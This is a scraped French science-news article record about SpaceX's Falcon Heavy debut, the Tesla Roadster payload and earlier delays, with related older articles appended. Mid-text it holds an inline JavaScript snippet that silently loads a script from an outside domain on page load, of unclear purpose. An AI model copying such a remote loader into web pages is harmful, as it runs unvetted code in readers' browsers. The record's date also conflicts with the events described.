{"title": "SpaceX : le premier tir du Falcon Heavy aura lieu ce mois-ci", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "12/05/2017", "content": "Alors qu'un Falcon 9 vient de réussir le lancement du satellite militaire secret Zuma, Falcon Heavy, le lanceur lourd de SpaceX, se prépare pour son premier vol. Coup de pub, la fusée embarquera la Tesla Roadster personnelle d'Elon Musk. Ce lanceur à deux étages est constitué de trois premiers étages du Falcon 9, pour un total de 27 moteurs. Une configuration que SpaceX a reconnu ne pas complètement maîtriser. Alors, explosion au décollage ou voiture en route à destination de Mars ? Sept ans après avoir été officiellement présenté, le Falcon Heavy est prêt à décoller. Elon Musk a utilisé les réseaux sociaux de  SpaceX  pour annoncer son vol inaugural dans le courant du mois de janvier. Ce lancement sera précédé d'un essai statique sur le pas de tir des moteurs de l'étage principal, prévu cette semaine. Les 27 moteurs de cet étage seront allumés brièvement dans une procédure courante appliquée avant chaque lancement de Falcon. Initialement, ce premier vol de démonstration devait embarquer une charge utile. Mais devant le risque élevé d'échec, la société  SpaceX  a préféré ne pas commercialiser ce lancement ni même l'offrir à une charge utile opérationnelle. Plutôt que de lancer le Falcon Heavy à vide, Elon Musk s'offre un joli coup de pub et va lancer à destination de Mars son propre  Tesla Roadster  rouge chantant  Space Oddity , de David Bowie, tout au long de son voyage interplanétaire qui devrait l'approcher de Mars. Le Tesla Roadster d'Elon Musk installé sur l'étage supérieur Falcon Heavy, avant que la coiffe du lanceur ne l'enferme pour le protéger du décalage. © SpaceX                       Zuma, le satellite secret de l'US Air Force, est lancé Ce vol inaugural était conditionné au lancement de Zuma, nom de code donné à un satellite secret du gouvernement américain qu'un Falcon 9 de SpaceX a mis en orbite ce 8 janvier, après plusieurs reports dus aux conditions météorologiques en Floride, aux prises avec une vague de froid inédite. Il a décollé du Centre spatial Kennedy, à partir du complexe de lancement 40, à proximité du pas de tir du Falcon Heavy.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Si cette mission de démonstration est un succès, SpaceX prévoit au moins deux autres lancements du Falcon Heavy dans le courant de l'année. Gwynne Shotwell, présidente et CEO de SpaceX, a en effet précisé que ce premier vol de démonstration serait suivi par le lancement d'un satellite géostationnaire de télécommunications d'Arabsat, puis du satellite  Space Test program 2  (STP-2) de l'US  Air  Force. Ce vol sera un essai en grandeur nature de la  mission GPIM  ( Green Propellant Infusion Mission ), de la Nasa. Le but est de tester une alternative à l' hydrazine , ergol fortement toxique et corrosif actuellement utilisé. Ce nouvel ergol serait 45 % plus dense et sa performance serait supérieure de 50 %. Le saviez-vous ? Dévoilé en avril 2011, le Falcon Heavy accuse un retard de plusieurs années. Alors qu'il devait entrer en service début 2013, le vol inaugural, prévu fin 2015, a  été reporté à plusieurs reprises  pour finalement être fixé en janvier 2018. Un retard qui s’explique en partie par des difficultés techniques mais aussi par la priorité donnée à la mise au point de la réutilisation des étages principaux du Falcon 9 et à la résolution des problèmes à l’origine de l’explosion de deux lanceurs Falcon 9 en 2015 et 2016. Pour en savoir plus Space X teste le noyau central de son lanceur lourd, le Falcon Heavy Article de  Rémy Decourt  publié le 12/05/2017 Le Falcon Heavy comptera 27 moteurs au culot de son étage principal, formé de trois étages principaux du Falcon 9, dont il sera donc la version lourde. En prévision d'un premier vol à la fin de cet été, SpaceX a réalisé un essai statique du noyau central. À la différence des deux autres étages, déjà utilisés en vol, l'étage central a été modifié pour que les deux autres puissent s'y accoler. D'où ce test, pour s'assurer que ces modifications n'altèrent pas ses performances. Le premier vol du Falcon Heavy, prévu à la fin de cet été, se prépare. Il y a quelques jours, sur son site de McGregor au Texas, SpaceX a réalisé un essai statique du noyau central de l'étage principal de ce futur  lanceur  lourd. Bien que la société n'ait pas précisé les données techniques de l'essai ni l'analyse des paramètres mesurés, il a été annoncé comme réussi. L'étage principal du Falcon Heavy utilisera trois étages principaux du Falcon 9 dans une configuration similaire à celle du  Delta 4  Heavy de United Launch Alliance. Seul l'étage central sera neuf. Les deux étages situés de part et d'autre du noyau central ont déjà volé lors de précédents lancements de Falcon 9. Initialement, SpaceX souhaitait utiliser trois  étages d’occasion , mais les modifications nécessaires à réaliser sur l'étage central, pour accoler les deux étages, étaient trop contraignantes. Extrait de 19 secondes de l'essai statique du noyau central de l'étage principal du Falcon Heavy. © SpaceX Une flottille de petits satellites à bord du deuxième Falcon Heavy Les retards du Falcon Heavy sont imputables aux raisons expliquées dans l'article ci-dessous mais également aux opérations de réparations du pas de tir SLC 40 de  Cap Canaveral , endommagé lors de l' explosion au sol  d'un lanceur Falcon 9, en septembre 2016. Son indisponibilité contraint SpaceX à utiliser le pas de tir 39A du Centre spatial Kennedy, que la société envisageait d'utiliser pour tester au sol le Falcon Heavy et la version habitée du Falcon 9. Le pas de tir du SLC 40 sera de nouveau en activité d'ici le mois de juin, ce qui permettra la reprise des lancements du Falcon 9 depuis Cap Canaveral tandis que le complexe de lancement 39A sera utilisé pour préparer le premier lancement du Falcon Heavy. C'est seulement lors de son deuxième lancement que ce lanceur embarquera une charge utile de plusieurs dizaines de satellites, dont le plus petit pèse à peine 1  kg  et les plus gros environ 180 kg. Parmi ces satellites, on citera la  voile solaire  de la Planetary Society, un démonstrateur de carburant vert et la  constellation   Observing System for Meteorology, Ionosphere and Climate  (Cosmic 2). Composée de douze satellites, elle devrait prendre la relève de la constellation Cosmic 1 destinée à la collecte de données de radio-occultation pour l'analyse et la prédiction des  ouragans . Autre constellation, les cinq CubeSats Prometheus pour des démonstrations technologiques de transferts de fichier audio, vidéo et de données à l'aide d'un petit terminal vers des stations au sol utilisant des communications par satellites au-delà de l'horizon. Ce lancement, provisoirement programmé pour la fin de 2017 sera vraisemblablement décalé au printemps 2018. Le Falcon Heavy de SpaceX, un lanceur lourd qui pourrait devenir totalement réutilisable Article de Rémy Decourt publié le 05/04/2017 Le lanceur lourd de SpaceX, très en retard sur son calendrier (le premier vol était prévu en 2013), devrait décoller cette année. Il doit permettre à l'entreprise américaine de se porter candidate pour le lancement des satellites les plus lourds de l'U.S. Air Force et de concurrencer  Arianespace  sur le marché des gros satellites de télécommunications. Ce futur lanceur pourrait également révolutionner le marché s'il devient comme promis, totalement réutilisable... Quelques jours après le succès du lancement d'un  Falcon 9 avec un étage réutilisé , Elon Musk annonce vouloir également récupérer l'étage supérieur du Falcon Heavy. Ce lanceur, en retard sur son calendrier, doit réaliser son premier vol cet été. Un retard qui ne s'explique pas seulement par les deux échecs du Falcon 9. Elon Musk a concédé que le développement du Falcon Heavy, dont l'étage principal est constitué de trois premiers étages du Falcon 9, a  « été une de ces choses qui a d'abord semblé facile » . Mais accoler deux «  boosters  » à un étage identique, pour un total de 27 moteurs, s'est révélé plus difficile que prévu. Le projet a nécessité une  « refonte du noyau central et l'ajout d'une tonne de matériel supplémentaire » . Sans doute faut-il entendre par  « une tonne »  une expression signifiant simplement une quantité importante. À ces  contraintes de développement , brièvement évoquées lors d'un précédent article, SpaceX en ajoute deux autres avec la volonté de récupérer non seulement les 27 moteurs du premier étage mais aussi l'étage supérieur, voire la coiffe du lanceur. Et ce dès le premier vol d'essai. Trois étages récupérés du Falcon 9. Lors de son premier vol, l'étage principal utilisera deux de ces boosters. Seul l'étage central sera neuf. © SpaceX                               Un premier lancement avec 27 moteurs à récupérer Pour le lancement prévu cet été, Elon Musk a annoncé la  couleur  :  « les boosters latéraux devraient revenir se poser sur la  terre  ferme tandis que l'étage central, celui qui fonctionnera le plus longtemps lors du vol, ira se poser sur notre barge » , située en pleine mer, à plusieurs centaines de kilomètres du rivage. Quant à l'étage supérieur du lanceur, Elon Musk n'a pas précisé comment il comptait le récupérer. Il a néanmoins concédé avec lucidité que  « les chances de réussite sont faibles, mais que cela vaut le coup d'essayer » . Au sujet de la coiffe du lanceur, on signalera que lors du lancement du Falcon 9 réutilisé, les deux parties de celle du satellite SES-10 ont été récupérées aves succès, dans l'océan, après une descente sous  parachute . Cette réutilisation possible se paie en  masse  maximale. Le Falcon Heavy est annoncé avec une performance de plus de 21 tonnes en  orbite de transfert  géostationnaire mais, dans sa version réutilisable, elle est diminuée d'une bonne moitié. En effet, le lanceur a besoin de carburant pour ramener les trois étages. Enfin, bien que SpaceX ait signé plusieurs contrats de lancements avec le Falcon Heavy, il volera pour ainsi dire à vide lors de son premier vol. En raison des risques inhérents à tout nouveau lanceur, SpaceX n'a pas souhaité embarquer un satellite ou une charge utile opérationnelle. Ce sera donc une charge factice, vraisemblablement équipée de  capteurs , voire de quelque chose dont la perte serait sans conséquence. Ce qu'il faut retenir Le Falcon Heavy, d'une performance de 21 tonnes en version non réutilisable, devrait voler cette année, après un développement qui a pris du retard. Il pourrait être totalement réutilisable. Ses capacités en feront un concurrent d'Ariane 5 et d'Ariane 6. Cela vous intéressera aussi Le Falcon 9 de SpaceX se pose sur une barge en mer                       SpaceX avait déjà réussi à ramener sur la terre ferme le premier étage de son lanceur spatial après un vol court. Le 9 avril 2016, après cinq tentatives ratées, l'entreprise américaine parvenait pour la première fois à le faire atterrir sur une barge en pleine mer, dans l'océan Atlantique. Après le lancement d'un satellite, l'engin, qui s'est beaucoup éloigné de son site de décollage, a ainsi beaucoup moins de chemin à parcourir.                                       ", "theme": "sciences"}